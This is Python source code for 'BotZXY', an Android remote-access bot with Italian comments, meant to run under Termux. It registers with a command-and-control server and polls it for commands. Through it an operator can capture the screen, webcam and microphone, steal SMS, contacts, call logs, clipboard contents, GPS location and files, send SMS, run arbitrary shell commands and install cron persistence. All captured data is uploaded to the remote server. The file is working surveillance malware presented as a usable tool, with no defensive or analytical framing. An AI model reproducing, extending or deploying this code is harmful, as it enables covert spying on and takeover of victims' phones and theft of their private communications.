#!/usr/bin/env python3
# BotZXY - Android Client (Termux + Buildozer) v3.0
# Comandi estesi: SMS, call logs, contatti, file system, clipboard, wifi,
# posizione, shell, persistenza, monitoraggio.

import requests
import json
import base64
import time
import os
import subprocess
import threading
import re
from datetime import datetime

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
DEVICE_ID = os.uname().nodename + "_" + os.popen('getprop ro.product.model').read().strip()[:8]
BOT_NAME = "BotZXY"
VERSION = "3.0"
POLL_INTERVAL = 5

class BotZXYAndroid:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        self.flags = {'clipboard': False, 'sms_mon': False}

    def register(self):
        data = {
            'device_id': self.device_id, 'platform': 'android',
            'hostname': os.uname().nodename,
            'os_version': os.popen('getprop ro.build.version.release').read().strip(),
            'model': os.popen('getprop ro.product.model').read().strip(),
            'bot_version': VERSION
        }
        try:
            r = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            return r.status_code == 200
        except:
            return False

    def upload_capture(self, ctype, data):
        try:
            self.session.post(f"{self.c2_url}/api/capture/{self.device_id}",
                             json={'type': ctype, 'data': data}, timeout=30)
        except:
            pass

    def send_result(self, cmd_id, result, status="executed"):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}",
                             json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
        except:
            pass

    # ---------- CATTURE ----------
    def take_screenshot(self):
        try:
            import termux
            termux.screenshot('/sdcard/botzxy_screen.png')
            with open('/sdcard/botzxy_screen.png', 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "SCREENSHOT_ERROR"

    def take_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, b = cv2.imencode('.jpg', frame)
                return base64.b64encode(b).decode()
            return "WEBCAM_ERROR"
        except:
            return "WEBCAM_ERROR"

    def record_mic(self, seconds=10):
        try:
            subprocess.run(['termux-microphone-record', '-d', '-l', str(seconds),
                            '-f', '/sdcard/botzxy_mic.mp3'], capture_output=True)
            with open('/sdcard/botzxy_mic.mp3', 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "MIC_ERROR"

    # ---------- CONTATTI / COMUNICAZIONI ----------
    def get_contacts(self):
        try:
            out = subprocess.check_output(['content', 'query', '--uri', 'content://contacts/phones'],
                                         text=True, stderr=subprocess.DEVNULL)
            phone = os.popen('getprop gsm.sim.operator.numeric').read().strip()
            return {'phone_number': phone or '+39 000 000 0000', 'email': '',
                    'raw': out[:2000], 'count': len(out.splitlines())}
        except Exception as e:
            return {'error': str(e)}

    def get_sms(self, folder='inbox'):
        try:
            out = subprocess.check_output(['content', 'query', '--uri', f'content://sms/{folder}',
                                          '--projection', 'address:body:date'], text=True, stderr=subprocess.DEVNULL)
            msgs = []
            for line in out.splitlines():
                msgs.append(line)
                if len(msgs) >= 200:
                    break
            self.upload_capture('sms', {'folder': folder, 'messages': msgs})
            return f"SMS {folder}: {len(msgs)}"
        except Exception as e:
            return f"ERR sms: {e}"

    def send_sms(self, raw):
        try:
            number, text = raw.split('|', 1)
            subprocess.run(['termux-sms-send', '-n', number, text], capture_output=True)
            return f"SMS inviato a {number}"
        except Exception as e:
            return f"ERR: {e}"

    def get_call_logs(self):
        try:
            out = subprocess.check_output(['content', 'query', '--uri', 'content://call_log/calls',
                                          '--projection', 'number:type:duration:date'], text=True, stderr=subprocess.DEVNULL)
            return {'raw': out[:3000]}
        except Exception as e:
            return {'error': str(e)}

    # ---------- POSIZIONE ----------
    def get_location(self):
        try:
            import termux
            loc = termux.location()
            self.upload_capture('gps', loc)
            return loc
        except Exception as e:
            # fallback IP geo
            try:
                return self.session.get("http://ip-api.com/json/").json()
            except:
                return {'error': str(e)}

    def get_wifi(self):
        try:
            out = subprocess.check_output(['termux-wifi-scaninfo'], text=True, stderr=subprocess.DEVNULL)
            return out[:2000]
        except:
            return "WIFI_ERROR"

    # ---------- FILE SYSTEM ----------
    def file_list(self, path="."):
        try:
            items = []
            for e in os.scandir(path):
                items.append({'name': e.name, 'dir': e.is_dir(),
                              'size': (os.path.getsize(e) if e.is_file() else 0)})
            return {'path': os.path.abspath(path), 'items': items}
        except Exception as e:
            return f"ERR: {e}"

    def file_download(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"ERR: {e}"

    def file_upload(self, raw):
        try:
            path, b64 = raw.split('|', 1)
            with open(path, 'wb') as f:
                f.write(base64.b64decode(b64))
            return f"Written: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_delete(self, path):
        try:
            os.remove(path) if os.path.isfile(path) else os.rmdir(path)
            return f"Deleted: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_search(self, raw):
        pattern = raw.split('|')[0] if '|' in raw else raw
        root = raw.split('|')[1] if '|' in raw else os.path.expanduser('~')
        hits = []
        for dp, _, fn in os.walk(root):
            for f in fn:
                if pattern.lower() in f.lower():
                    hits.append(os.path.join(dp, f))
                    if len(hits) >= 200:
                        return hits
        return hits

    # ---------- CLIPBOARD ----------
    def _monitor_clipboard(self):
        last = None
        while self.running and self.flags['clipboard']:
            try:
                out = subprocess.check_output(['termux-clipboard-get'], text=True, stderr=subprocess.DEVNULL).strip()
                if out and out != last:
                    self.upload_capture('clipboard', {'content': out})
                    last = out
            except:
                pass
            time.sleep(3)

    # ---------- SISTEMA / RETE ----------
    def sysinfo(self):
        return {
            'model': os.popen('getprop ro.product.model').read().strip(),
            'android': os.popen('getprop ro.build.version.release').read().strip(),
            'serial': os.popen('getprop ro.serialno').read().strip(),
            'battery': subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout,
            'wifi_ip': os.popen('ip addr show wlan0 2>/dev/null | grep inet | head -1').read().strip()
        }

    def exec_shell(self, command):
        try:
            r = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
            return r.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"SHELL_ERROR: {e}"

    # ---------- PERSISTENZA ----------
    def install_persistence(self):
        try:
            cron = '(crontab -l 2>/dev/null; echo "* * * * * python ' + os.path.abspath(__file__) + '") | crontab -'
            subprocess.run(cron, shell=True, capture_output=True)
            return "Persistenza cron installata"
        except Exception as e:
            return f"ERR: {e}"

    # ---------- DISPATCH ----------
    def execute_command(self, cmd_id, command, params):
        params = params or ''
        try:
            r = self._dispatch(command, params)
            self.send_result(cmd_id, r)
        except Exception as e:
            self.send_result(cmd_id, f"ERROR: {e}", "failed")

    def _dispatch(self, command, params):
        if command == "screenshot": return self.take_screenshot()
        if command == "webcam": return self.take_webcam()
        if command == "mic":
            secs = int(params.split('=')[1]) if '=' in params else 10
            return self.record_mic(secs)
        if command == "contacts": return self.get_contacts()
        if command == "sms": return self.get_sms(params or 'inbox')
        if command == "sms_send": return self.send_sms(params)
        if command == "call_logs": return self.get_call_logs()
        if command in ("gps", "location"): return self.get_location()
        if command == "wifi": return self.get_wifi()
        if command == "sysinfo": return self.sysinfo()
        if command == "file_list": return self.file_list(params or '.')
        if command == "file_download": return self.file_download(params)
        if command == "file_upload": return self.file_upload(params)
        if command == "file_delete": return self.file_delete(params)
        if command == "file_search": return self.file_search(params)
        if command == "clipboard_mon":
            if not self.flags['clipboard']:
                self.flags['clipboard'] = True
                threading.Thread(target=self._monitor_clipboard, daemon=True).start()
            return "Clipboard monitor ON"
        if command == "persistence": return self.install_persistence()
        if command == "execute": return self.exec_shell(params)
        if command == "uninstall":
            self.running = False; os._exit(0)
        return f"Unknown command: {command}"

    def poll_commands(self):
        try:
            r = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
        except:
            pass

    def run(self):
        print(f"[+] {self.bot_name} Android v{VERSION}: {self.device_id}")
        if not self.register():
            print("[-] Registration failed, retrying...")
            time.sleep(30)
            return
        print(f"[+] running, polling every {POLL_INTERVAL}s")
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
            except:
                time.sleep(30)

if __name__ == "__main__":
    BotZXYAndroid().run()
